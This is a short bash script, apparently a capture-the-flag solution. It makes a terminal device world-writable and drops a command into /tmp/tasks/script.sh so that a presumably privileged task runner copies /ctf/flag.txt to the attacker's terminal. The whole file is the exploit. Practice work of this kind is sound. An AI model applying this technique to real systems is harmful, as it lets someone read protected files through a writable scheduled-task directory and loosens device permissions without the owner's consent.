#!/bin/bash
# before run this script use command who or set | grep /dev/pts to know 
#the pts number then run this script with the number as argument
if [ $# -eq 1 ]; then 
    chmod 777 /dev/pts/$1
    echo "/bin/cat /ctf/flag.txt > /dev/pts/$1" > /tmp/tasks/script.sh && chmod +x /tmp/tasks/script.sh
else
    echo "[*] Enter the pts number /dev/pts/*"
fi


